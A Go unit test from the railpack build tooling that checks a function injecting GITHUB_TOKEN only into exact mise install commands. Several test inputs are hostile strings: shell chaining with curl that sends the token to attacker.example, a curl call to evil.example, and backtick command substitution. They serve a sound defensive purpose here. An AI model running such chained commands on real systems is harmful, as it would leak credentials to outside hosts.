package build_llb

import (
	"testing"

	"github.com/railwayapp/railpack/core/generate"
	"github.com/stretchr/testify/require"
)

// isMiseInstallCommand gates whether GITHUB_TOKEN is injected into a build
// command's environment. plan.ExecCommand carries no marker distinguishing
// a railpack-generated command from one supplied verbatim in a user plan,
// so this must match only the exact shapes railpack itself ever generates —
// never a prefix, or a user-supplied command could smuggle extra shell text
// past the check to exfiltrate the token.
func TestIsMiseInstallCommand(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want bool
	}{
		{"exact mise install", generate.MiseInstallCommand, true},
		{"exact mise install-into", "mise install-into node@20.11.0 /railpack/node", true},
		{"install-into with dotted version", "mise install-into python@3.12.1 /railpack/python", true},

		{"prefix with shell chaining", "mise install; curl attacker.example -d $GITHUB_TOKEN", false},
		{"prefix with extra flag", "mise install --yes", false},
		{"install-into with injected semicolon", "mise install-into node@20; curl evil.example /x", false},
		{"install-into with injected space token", "mise install-into node@20 /x extra", false},
		{"install-into with backtick", "mise install-into node@`whoami` /x", false},
		{"unrelated command", "npm install", false},
		{"empty command", "", false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			require.Equal(t, tc.want, isMiseInstallCommand(tc.cmd))
		})
	}
}
